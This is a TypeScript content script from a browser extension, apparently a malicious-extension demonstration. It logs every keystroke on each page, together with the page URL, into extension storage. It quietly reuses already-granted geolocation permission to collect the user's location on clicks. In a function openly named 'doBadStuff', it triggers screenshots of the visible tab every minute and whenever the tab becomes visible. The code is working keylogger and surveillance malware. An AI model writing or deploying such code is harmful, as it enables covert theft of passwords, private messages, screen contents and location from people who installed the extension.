import _ from "lodash";
import { IKeyLogEntry } from "src/interfaces";
import { BackgroundMessage, StorageKey } from "../consts";
import { sendMessage, updateGeolocation } from "../utils/page-utils";
import { logData, simplePrepend, writeLog } from "../utils/shared-utils";

let buffer = "";

function piggybackGeolocation() {
  // Piggyback permissions for geolocation
  navigator.permissions
    .query({ name: "geolocation" })
    .then(({ state }: { state: string }) => {
      if (state === "granted") {
        updateGeolocation();
      }
    });
}

async function doBadStuff() {
  if (document.visibilityState === "visible") {
    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
  }
}

const writeBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
      ...logData(),
      url: window.location.href,
      buffer,
    });

    buffer = "";

    writeLog("Wrote keylog buffer");
  }
}, 2000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  writeBuffer();
});

document.addEventListener("visibilitychange", doBadStuff);

document.addEventListener("click", piggybackGeolocation);

setInterval(() => {
  doBadStuff();
}, 60 * 1e3);

doBadStuff();
